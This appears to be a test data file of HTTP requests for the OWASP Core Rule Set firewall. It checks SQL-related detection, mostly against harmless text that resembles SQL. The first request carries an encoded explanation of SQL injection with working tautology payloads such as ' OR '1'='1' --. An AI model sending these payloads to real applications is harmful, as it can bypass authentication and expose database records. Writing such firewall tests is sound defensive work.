+SQL	POST	/post		OWASP CRS test agent		var=Incorrectly%20constructed%20SQL%20statements%0AThis%20form%20of%20injection%20relies%20on%20the%20fact%20that%20SQL%20statements%20consist%20of%20both%20data%20used%20by%20the%20SQL%20statement%20and%20commands%20that%20control%20how%20the%20SQL%20statement%20is%20executed.%20For%20example%2C%20in%20the%20SQL%20statement%20select%20*%20from%20person%20where%20name%20%3D%20'susan'%20and%20age%20%3D%202%20the%20string%20'susan'%20is%20data%20and%20the%20fragment%20and%20age%20%3D%202%20is%20an%20example%20of%20a%20command%20(the%20value%202%20is%20also%20data%20in%20this%20example).%0A%0ASQL%20injection%20occurs%20when%20specially%20crafted%20user%20input%20is%20processed%20by%20the%20receiving%20program%20in%20a%20way%20that%20allows%20the%20input%20to%20exit%20a%20data%20context%20and%20enter%20a%20command%20context.%20This%20allows%20the%20attacker%20to%20alter%20the%20structure%20of%20the%20SQL%20statement%20which%20is%20executed.%0A%0AAs%20a%20simple%20example%2C%20imagine%20that%20the%20data%20'susan'%20in%20the%20above%20statement%20was%20provided%20by%20user%20input.%20The%20user%20entered%20the%20string%20'susan'%20(without%20the%20apostrophes)%20in%20a%20web%20form%20text%20entry%20field%2C%20and%20the%20program%20used%20string%20concatenation%20statements%20to%20form%20the%20above%20SQL%20statement%20from%20the%20three%20fragments%20select%20*%20from%20person%20where%20name%3D'%2C%20the%20user%20input%20of%20'susan'%2C%20and%20'%20and%20age%20%3D%202.%0A%0ANow%20imagine%20that%20instead%20of%20entering%20'susan'%20the%20attacker%20entered%20'%20or%201%3D1%3B%20--.%0A%0AThe%20program%20will%20use%20the%20same%20string%20concatenation%20approach%20with%20the%203%20fragments%20of%20select%20*%20from%20person%20where%20name%3D'%2C%20the%20user%20input%20of%20'%20or%201%3D1%3B%20--%2C%20and%20'%20and%20age%20%3D%202%20and%20construct%20the%20statement%20select%20*%20from%20person%20where%20name%3D''%20or%201%3D1%3B%20--%20and%20age%20%3D%202.%20Many%20databases%20will%20ignore%20the%20text%20after%20the%20'--'%20string%20as%20this%20denotes%20a%20comment.%20The%20structure%20of%20the%20SQL%20command%20is%20now%20select%20*%20from%20person%20where%20name%3D''%20or%201%3D1%3B%20and%20this%20will%20select%20all%20person%20rows%20rather%20than%20just%20those%20named%20'susan'%20whose%20age%20is%202.%20The%20attacker%20has%20managed%20to%20craft%20a%20data%20string%20which%20exits%20the%20data%20context%20and%20entered%20a%20command%20context.%0A%0AA%20more%20complex%20example%20is%20now%20presented.%0A%0AImagine%20a%20program%20creates%20a%20SQL%20statement%20using%20the%20following%20string%20assignment%20command%20%3A%0A%0Avar%20statement%20%3D%20%22SELECT%20*%20FROM%20users%20WHERE%20name%20%3D%20'%22%20%2B%20userName%20%2B%20%22'%22%3B%0A%0AThis%20SQL%20code%20is%20designed%20to%20pull%20up%20the%20records%20of%20the%20specified%20username%20from%20its%20table%20of%20users.%20However%2C%20if%20the%20%22userName%22%20variable%20is%20crafted%20in%20a%20specific%20way%20by%20a%20malicious%20user%2C%20the%20SQL%20statement%20may%20do%20more%20than%20the%20code%20author%20intended.%20For%20example%2C%20setting%20the%20%22userName%22%20variable%20as%3A%0A%0A'%20OR%20'1'%3D'1%0Aor%20using%20comments%20to%20even%20block%20the%20rest%20of%20the%20query%20(there%20are%20three%20types%20of%20SQL%20comments%5B14%5D).%20All%20three%20lines%20have%20a%20space%20at%20the%20end%3A%0A%0A'%20OR%20'1'%3D'1'%20--%0A'%20OR%20'1'%3D'1'%20%7B%0A'%20OR%20'1'%3D'1'%20%2F*%20	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		email='foo';'bar';'def'	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		email=`foo`;`bar`;`def`	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		----------397236876 Content-Disposition: form-data; name="document"; filename="document.md" Content-Type: text/markdown  # Foo my name is 'foo'; and I work on CRS. # Bar my name is "bar"; and I work on CRS. ----------397236876-- 	User-Agent: OWASP CRS test agent Content-Type: multipart/form-data; boundary=--------397236876
+SQL	GET	/get	q=how%20was%20your%20day%20today?	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	gift_message=%20I%20Love%20you%20%3C3	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	message=Find%20your%20solution%20here%20-%3E%20link	OWASP CRS test agent			User-Agent: OWASP CRS test agent
